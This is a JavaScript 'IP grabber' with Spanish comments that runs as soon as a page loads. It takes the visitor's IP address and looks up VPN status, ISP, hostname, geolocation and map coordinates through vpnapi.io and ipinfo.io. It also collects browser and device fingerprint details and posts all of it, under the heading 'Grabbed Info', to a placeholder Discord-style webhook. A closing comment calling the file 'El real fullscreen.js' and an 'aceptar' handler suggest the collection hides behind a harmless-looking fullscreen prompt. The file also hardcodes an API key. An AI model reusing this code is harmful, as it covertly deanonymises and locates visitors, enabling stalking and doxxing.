function device_info() {
  var info = {
      SO: detectOS(),
      Navegador: detectBrowser(),
      Phone_device: is_mobile(),
      Hora: detectTime(),
      Idioma: navigator.language,
      Resolution: detectResolution(),
      vendor: navigator.vendor,
      userAgent: navigator.userAgent,
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      hardwareConcurrency: navigator.hardwareConcurrency,
      maxTouchPoints: navigator.maxTouchPoints
  };

  var json = "";
  for (var key in info) {
      json += key + ': ' + info[key] + "\n";
  }
  
  return json;
};

function detectOS() {
  let os = navigator.userAgent;
  let finalOs="";
  if (os.search('Windows')!==-1){
      finalOs = "Windows";
  } else if (os.search('Mac')!==-1){
      finalOs = "MacOS";
  } else if (os.search('X11')!==-1 && !(os.search('Linux')!==-1)){
      finalOs = "UNIX";
  } else if (os.search('Linux')!==-1 && os.search('X11')!==-1){
      finalOs = "Linux"
  } else if (os.search('Android')!==-1){
      finalOs = "Android"
  } else if (os.search('iPhone')){
      finalOs = "iPhone"
  } else {
    finalOs = "yokse"
  }
  return finalOs

};

function detectBrowser() {
  let userAgent = navigator.userAgent;
  let browserName;

  if (userAgent.match(/chrome|chromium|crios/i)) {
      browserName = "Chrome";
  } else if (userAgent.match(/firefox|fxios/i)) {
      browserName = "Firefox";
  } else if (userAgent.match(/safari/i)) {
      browserName = "Safari";
  } else if (userAgent.match(/opr\//i)) {
      browserName = "Opera";
  } else if (userAgent.match(/edg/i)) {
      browserName = "Edge";
  } else {
      browserName = "No browser detection";
  }

  return browserName
};

function is_mobile() {
  var a;
  if (navigator.userAgent.match(/Android/i) ||
      navigator.userAgent.match(/webOS/i) ||
      navigator.userAgent.match(/iPhone/i) ||
      navigator.userAgent.match(/iPad/i) ||
      navigator.userAgent.match(/iPod/i) ||
      navigator.userAgent.match(/BlackBerry/i) ||
      navigator.userAgent.match(/Windows Phone/i)) {
      a = "Yes";
  } else {
      a = "No";
  }
  return a;
};

function detectResolution() {
  resol = [
    "\n\t" + "Window size: " + window.innerWidth + 'x' + window.innerHeight + "\n\t" +
    "Screen size: " + window.screen.width + 'x' + window.screen.height + "\n\t" +
    "Available screen size: " + window.screen.availWidth + 'x' + window.screen.availHeight + "\n\t" +
    "Color depth: " + window.screen.colorDepth + "\n\t" +
    "Orientation: " + (window.screen.orientation ? window.screen.orientation.type : "N/A") + "\n\t" +
    "Orientation Lock: " + (window.screen.orientation ? window.screen.orientation.locked : "N/A") + "\n\t" +
    "TimeZone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n"
  ];

  return resol
};

function detectTime() {
  var currentTime = new Date();
  var hours = currentTime.getHours();
  var minutes = currentTime.getMinutes();
  var seconds = currentTime.getSeconds();

  minutes = (minutes < 10 ? "0" : "") + minutes;
  seconds = (seconds < 10 ? "0" : "") + seconds;

  var formattedTime = hours + ":" + minutes + ":" + seconds;
  return formattedTime;
}

// Request a la api de vpnapi.io, funciones async, 
  // request de curl:
    // $ curl 'https://vpnapi.io/api/'"$(curl ifconfig.me)"'?key=f0b7f18a3e7541149ae064d21b443589'
    // $ curl 'https://ipinfo.io/'"$(curl ifconfig.me)"'/org'  <- ISP
    // $ curl 'https://ipinfo.io/'"$(curl ifconfig.me)"'/hostname'  <- hostname

const apikey = "f0b7f18a3e7541149ae064d21b443589";

async function detectVPN(ip) {
  try {
    const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
    const response = await fetch(apiUrl);
    const data = await response.json();
    return data.security.vpn;
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
};

async function detectLocation(ip) {
  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    var place = `${data.location.country}, ${data.location.region}, ${data.location.city}`
    return place;
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
};

async function generateLink(ip, site) {
  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    var latitude = data.location.latitude;
    var longitude = data.location.longitude;
    var maps_url = `https://google.com/maps/place/${latitude},${longitude}`;
    var myipaddress_url = `https://whatismyipaddress.com/ip/${ip}`;
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
    
  if (site == "maps") {
    return maps_url
  } else {
    return myipaddress_url
  }
  
};

async function generateImgUrl(ip) {
  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    var county_code = data.location.country_code;
    var country_codeLower = county_code.toLowerCase();
    var url = `https://flagcdn.com/108x81/${country_codeLower}.png`
    return url;
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
};

async function detectAllSecurity(ip) {
  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    
    var security = "";
    for (var key in data.security) {
      security += '\t' + key + ': ' + data.security[key] + "\n";
    }
    return security;
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
};

async function detectAllLocation(ip) {
  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    
    var all_location = "";
    for (var key in data.location) {
      all_location += '\t' + key + ': ' + data.location[key] + "\n";
    }
    return all_location;
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
};

function imgOS() { 
  var OSname = detectOS()
  if (OSname == "Linux") {
    return "https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Tux.svg/506px-Tux.svg.png?20220320193426"
    // return "images/chat.png"
  }else if (OSname == "Windows") {
    return "https://www.freepnglogos.com/uploads/windows-logo-png/windows-logo-logok-0.png"
  }else if (OSname == "Mac") {
    return "https://cdn-icons-png.flaticon.com/512/2/2235.png"
  } else if (OSname == "Android") {
    return "https://upload.wikimedia.org/wikipedia/commons/thumb/6/64/Android_logo_2019_%28stacked%29.svg/2346px-Android_logo_2019_%28stacked%29.svg.png"
  } else if (OSname == "iPhone") {
    return "https://media.croma.com/image/upload/v1662703724/Croma%20Assets/Communication/Mobiles/Images/261934_qgssvy.png"
  }else { 
    return "https://www.expofarm.es/wp-content/uploads/2021/09/cruz-farmacia.jpg"
  }
}

async function detectISP(ip) {
  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    var ISP = `${data.network.autonomous_system_number} ${data.network.autonomous_system_organization}`
    return ISP;
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
};

async function detecthostname(ip) {
  const apiUrl = `https://ipinfo.io/${ip}/json`
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    
    var hostname = data.hostname;
    return hostname;
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
}

// Send data & collect ip
var ip = '';
fetch('https://api.ipify.org/?format=json')
  .then(function(response) {
    return response.json();
  })
  .then(async function(data) {
    ip = data.ip;
    var webwhook = 'YOUR_WEBHOOK';
    try {
        var is_vpn = await detectVPN(ip);
        var location = await detectLocation(ip);
        var security = await detectAllSecurity(ip);
        var all_location = await detectAllLocation(ip);
        var maps_url = await generateLink(ip, "maps");
        var myipaddress_url = await generateLink(ip, "myipaddress");
        var flagUrl = await generateImgUrl(ip);
        var osIMG = imgOS();
        var ISP = await detectISP(ip);
        var hostname = await detecthostname(ip);
        
        
    } catch(error) {
        console.log(error);
    }
    var message = {
      content: 
        '__**Grabbed Info**__' + '\n' + 
        '```js' + '\n' +
        'VPN: ' + is_vpn + '\n' +
        'IP: ' + ip + '\n' +
        'ISP: ' + ISP + '\n' +
        'Hostname: ' + hostname + '\n' +
        'Lugar: ' + location + '\n' +
        '------------------------------' + '\n\n' +
        device_info() + '\n------ ------ ------ \n' +
        'All Security: \n' + security + '\n------ ------ ------ \n' +
        'All Location: \n' + all_location +

        '```' + '\n' +
        '### Maps: ' + maps_url + '\n' + 
        '### My ip address: ' + myipaddress_url,

      embeds: [
        {
          image: {
            url: flagUrl
          }
        },
        {
          image: {
            url: osIMG
          }
        }
      ]
    };

    fetch(webwhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    });
  });


// El real fullscreen.js
function aceptar() {
  document.getElementById("contenido").style.display = "block";
  document.getElementById("mensaje").style.display = "none";
  document.documentElement.requestFullscreen();
};